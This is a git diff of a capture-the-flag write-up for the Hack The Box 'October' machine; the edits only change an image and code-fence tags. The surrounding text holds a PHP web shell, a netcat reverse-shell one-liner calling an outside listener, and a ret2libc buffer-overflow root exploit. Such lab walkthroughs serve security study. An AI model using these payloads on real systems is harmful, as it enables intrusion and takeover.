@@ -5,7 +5,7 @@ excerpt: "October is a fun medium linux box where're going to upload a php5 reve
 date: 2023-01-13
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-october/october_logo.png
+  teaser: /assets/images/htb-writeup-october/new.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -15,7 +15,11 @@ tags:
   - CMS
   - Buffer Overflow
 ---
-![](/assets/images/htb-writeup-october/october_logo.png)
+
+<p align="center">
+<img src="/assets/images/htb-writeup-october/october_logo.png">
+</p>
+
 
 October is a fun medium linux box where're going to upload a php5 reverse shell to win access and to be root we have to exploit a Buffer Overflow.Important= Maybe the writeup have errors according me everything is good but I had errors with the file of the writeup sorry if something is wrong I'll fix it.
 
@@ -23,7 +27,7 @@ October is a fun medium linux box where're going to upload a php5 reverse shell 
 
 The version of ssh it's very old you can use a script to enumerate users of the machine
 
-```
+```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-13 17:26 CST
 Nmap scan report for 10.10.10.16
 Host is up (0.18s latency).
@@ -45,7 +49,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 In this machine I don't going to use it
 
-```
+```bash
 ❯ searchsploit ssh user enumeration
 ---------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                |  Path
@@ -63,7 +67,7 @@ Shellcodes: No Results
 
 The web use PHP5 and have something interesting `October CMS - Vanilla`
 
-```
+```bash
 ❯ whatweb http://10.10.10.16
 http://10.10.10.16 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
 ```
@@ -80,7 +84,7 @@ This is the webpage
 
 Vulnerabilities 
 
-```
+```bash
 ❯ searchsploit October
 ---------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                |  Path
@@ -124,7 +128,7 @@ If we click on `Media` we found the file dr.php5 so I think we can upload a file
 
 ![](/assets/images/htb-writeup-october/php5.png)
 
-```
+```bash
 ❯ /usr/bin/cat cmd.php5
 <?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
@@ -145,18 +149,18 @@ And works
 
 ## Reverse shell
 
-```
+```bash
 nc -lvnp 443
 listening on [any] 443 ...
 ```
 
 Now send the reverse shell
 
-```
+```bash
 ❯ curl http://10.10.10.16/storage/app/media/cmd.php5 --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 443 >/tmp/f"
 ```
 
-```
+```bash
 ❯ nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.21] from (UNKNOWN) [10.10.10.16] 58834
@@ -168,7 +172,7 @@ $
 
 Better shell
 
-```
+```bash
 $ python -c 'import pty;pty.spawn("bash")'
 www-data@october:/var/www/html/cms/storage/app/media$
 Ctrl + Z
@@ -182,14 +186,14 @@ www-data@october:/var/www/html/cms/storage/app/media$ export TERM=xterm
 
 Now we can read the user flag
 
-```
+```bash
 www-data@october:/home/harry$ cat user.txt 
 3c0ab4301ddd0d355b74672970ba2279
 ```
 
 ## Buffer Overflow
 
-```
+```bash
 www-data@october:/$ find -user root -perm -4000 2>/dev/null
 ./bin/umount
 ./bin/ping
@@ -230,7 +234,7 @@ This tool help when you want to understand how buffer overflow works
 
 ## Process to be Root
 
-```
+```bash
 www-data@october:/$ ldd /usr/local/bin/ovrflw
 	linux-gate.so.1 =>  (0xb7720000)
 	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7566000)
@@ -240,7 +244,7 @@ www-data@october:/$
 
 Is dynamic 
 
-```
+```bash
 www-data@october:/$ for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
 0xb75d1000
 0xb7601000
@@ -261,13 +265,13 @@ www-data@october:/$
 
 If you copy one address I copy this
 
-```
+```bash
 0xb75de000
 ```
 
 With this we can see that there is a collision
 
-```
+```bash
 www-data@october:/$ for i in $(seq 100000); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xb75de000"
 0xb75de000
 0xb75de000
@@ -277,7 +281,7 @@ www-data@october:/$ for i in $(seq 100000); do ldd /usr/local/bin/ovrflw | grep 
 www-data@october:/$
 ```
 
-```
+```bash
 www-data@october:/$ cd /tmp
 www-data@october:/tmp$ touch buff.py
 ```
@@ -286,7 +290,7 @@ We need more information to abusse of the buffer overflow we're going to use thi
 
 Readelf displays information about one or more ELF format object files. The options control what particular information to display. elffile... are the object files to be examined. 32-bit and 64-bit ELF files are supported, as are archives containing ELF files.
 
-```
+```bash
 www-data@october:/tmp$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
    139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
@@ -295,7 +299,7 @@ www-data@october:/tmp$
 
 This is a python3 script to have a shell with root
 
-```
+```bash
 #!/usr/bin/python3
 
 from struct import pack
@@ -326,7 +330,7 @@ print(payload)
 
 And works
 
-```
+```bash
 www-data@october:/tmp$ python3 buff.py 
 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x13a\xb7`B`\xb7\xac;s\xb7'
 # whoami
